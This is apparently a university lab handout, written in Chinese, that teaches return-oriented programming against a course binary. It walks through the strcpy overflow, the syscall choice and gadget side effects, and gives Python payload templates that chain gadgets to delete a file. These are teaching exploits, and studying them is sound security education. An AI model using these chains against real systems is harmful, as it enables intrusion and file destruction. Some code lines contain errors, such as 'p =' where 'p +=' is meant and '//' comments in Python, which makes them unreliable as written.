# ROP
该实验是南京大学系统与软件安全课程ROP实验文档的一部分，本文主要介绍了ROP的基本原理与exploit的编写。通过该文档，可以了解ROP攻击的基本原理，并能够应对含有副作用的ROP gadget。  
- Buffer Overflow 实验文档及代码。
[Buffer Overflow](https://github.com/NJUSeclab/Software_Security_Experiments/tree/master/Buffer%20Overflow)  
- ROP 实验文档及二进制程序。
[ROP](https://github.com/NJUSeclab/Software_Security_Experiments/tree/master/ROP)
## 实验环境
同buffer overflow实验相同，将二进制程序拷贝到上次实验的虚拟机中。二进制程序可以在实验的github连接进行下载。  
vagrant默认将当前路径挂载到虚拟机的`/vagrant`文件夹下，可以将二进制程序与Vagrantfile放在一起，之后进入虚拟机使用以下命令将二进制拷贝到当前目录。
```
cp /vagrant/rop_test .
```


## 分析漏洞程序
分析二进制文件，分析程序逻辑，可以看出在函数`vul`处存在buffer overflow漏洞。  
可以使用IDA pro或者直接使用objdump查看二进制文件。当然，也可以使用gdb直接对二进制文件进行调试，使用`disassemble`命令查看反汇编。
```asm
vul:
   0x0804854d <+0>:     push   ebp
   0x0804854e <+1>:     mov    ebp,esp
   0x08048550 <+3>:     sub    esp,0x88
   0x08048556 <+9>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048559 <+12>:    mov    DWORD PTR [esp+0x4],eax
   0x0804855d <+16>:    lea    eax,[ebp-0x6c]
   0x08048560 <+19>:    mov    DWORD PTR [esp],eax
   0x08048563 <+22>:    call   0x80483f0 <strcpy@plt>             <---------strcpy()
   0x08048568 <+27>:    leave
   0x08048569 <+28>:    ret
```
通过`checksec rop_test`可以看到二进制文件开启什么样的保护。
```
    Canary                        : No
    NX                            : Yes
    PIE                           : No
    Fortify                       : No
    RelRO                         : Partial
```
发现二进制并没有添加canary保护，可以通过修改返回地址实现ROP攻击。

# ROP攻击

## 查找系统调用
首先，我们需要清楚我们需要完成什么样的目标，然后我们再去寻找我们需要的gadget。  
例如：在本次实验中我们需要完成的目标是**删除当前目录下data文件**。
- 需要清楚完成删除操作的系统调用是什么。
    - [unlink](http://man7.org/linux/man-pages/man2/unlink.2.html)
    - `int unlink(const char *pathname);`
    - 系统调用号：10 -> eax
    - 参数：`char * pathname`->ebx
- 退出函数的系统调用是什么
    - [exit](http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html) 
    - `void _exit(int status);`
    - 系统调用号：1 -> eax
    - 参数：`int status` -> ebx


## ROP 原理 
假设我们有如下栈布局：
```
|---------------|                           gadget1: pop eax; ret;
|---------------|                           gadget2: pop ebx; ret;
|- 'data' addr -|
|-gadget2 addr -|                           
|     0xa       |
|-gadget1 addr -|<----- esp
|---------------|
|---------------|
```
gadget1和gadget2是代码段中以`ret`结尾的代码片段，其中`gadget1 address`是它们的地址。

1. 在函数执行到`ret`指令时，`esp`指向当前的返回地址。  
2. 当返回地址被覆盖为`gadget1 address`，程序执行`ret`会跳转到`gadget1: pop eax; ret;`并执行，并且`esp`加4指向`0xa`内容。  
3. 执行`pop eax`指令，也就是将`esp`指向的数据放入`eax`中，并且`esp`加4， 此时`esp`指向`gadget2 address`。  
4. 继续执行`ret`指令，`esp`指向`gadget2 address`即跳转到`gadget2: pop ebx; ret;`并执行。如此完成gadget链的链接过程。
5. 接下来gadget执行和链接如上述过程`3 -> 4`。

## 构造gadget链
### ROP gadget
首先我们想要进行`unlink`系统调用，我们需要对`eax`，`ebx`寄存器进行赋值操作。  
那么我们可以构造如下gadget：
```python
offset = 0xff
p = 'A' * offset        # ret_addr之前的填充
p += pop_eax_addr       # pop eax; ret;
p += 0xa                # unlink系统调用号
p += pop_ebx_addr       # pop ebx; ret;
p += data_addr          # 'data'字符串的地址
p += int_0x80           # int 0x80;
```
但是，在`strcpy`函数的使用时，遇到`\0, \n, \t`会被认作结束符，因此在我们的payload中不能存在这些字符。例如在上述payload中，0xa在内存中的表示为`0x0a 0x00 0x00 0x00`，所以要进行修改。  
修改gadget为：
```python
offset = 0xff
p = 'A' * offset        # ret_addr之前的填充
p = xor_eax_addr        # xor eax, eax; ret
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p = inc_eax_addr        # inc eax; ret;
p += pop_ebx_addr       # pop ebx; ret;
p += data_addr          # 'data'字符串的地址
p += int_0x80           # int 0x80;
```
该gadget可以达到同样的效果。

### 取字符串地址
假设我们将文件名字符串放在栈上，那么取字符串地址的方法和`return to shellcode`实验相同，仅需要知道`buf`的首地址即可计算字符串的地址。**注意**：文件名字符串应放到payload的最后位置，否则会出现截断问题或者删除时文件名不存在。（C语言中字符串是以`'\0'`结尾的）  


### 副作用
例如在该试验中遇到的副作用：
```
int 0x80 ; pop eax ; ret
```
当执行完`int 0x80`后，又执行了`pop eax`，因此需要在栈上多放置一个长度为4字节的数据，消除`pop eax`副作用。
```
int 0x80 ; push esi ; ret
```
同理，在执行完`int 0x80`后，执行`push esi`后，此时`esp`指向刚`push`到栈上的数据，也就是`esi`的内容，为了消除该副作用，可以在执行`int 0x80`之前，将`esi`赋值为需要的`ret addr`。


### 最终版的payload
版本1
```python
from struct import *
# buf to ret_addr
offset = 0xff

base_libcaddr = 0xffffffff
buf_addr = 0xffffffff
# Padding goes here

p = ''
p += offset * 'A'

p += pack('<I', pop_ebx_addr + base_libcaddr) # pop ebx ; ret
p += pack('<I', buf_addr + fileName_string_offset)    # data addr

p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret

// side effect
p += pack('<I', 0x8048623) # int 0x80 ; pop eax ; ret
p += pack('<I', 0xfffffff)

// exit()
p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
p += pack('<I', int_addr + base_libcaddr) # int 0x80

// file name string
p += 'data\0'
print(p)
```
可以运行`python attack.py > payload`产生payload文件。
使用`./rop_test payload`完成攻击（删除当前路径下data文件）。


版本2
```python
from struct import *

offset = 0xff

base_libcaddr = 0xffffffff
# Padding goes here
p = ''
p += offset * 'A'

p += pack('<I', ? + base_libcaddr) # pop edx ; ret
p += pack('<I', ? + base_libcaddr) # @ .data      .data is data segment
p += pack('<I', ? + base_libcaddr) # pop eax ; ret
p += 'data'
p += pack('<I', ? + base_libcaddr) # mov dword ptr [edx], eax ; ret

p += pack('<I', ? + base_libcaddr) # pop edx ; ret
p += pack('<I', ? + base_libcaddr) # @ .data + 4
p += pack('<I', ? + base_libcaddr) # xor eax, eax ; ret
p += pack('<I', ? + base_libcaddr) # mov dword ptr [edx], eax ; ret
p += pack('<I', ? + base_libcaddr) # pop ebx ; ret
p += pack('<I', ? + base_libcaddr) # @ .data

p += pack('<I', ? + base_libcaddr) # xor eax, eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret

p += pack('<I', ?) # int 0x80 ; pop eax ; ret
p += pack('<I', 0xfffffff)

p += pack('<I', ? + base_libcaddr) # xor eax, eax ; ret
p += pack('<I', ? + base_libcaddr) # inc eax ; ret
p += pack('<I', ? + base_libcaddr) # int 0x80
print(p)

```
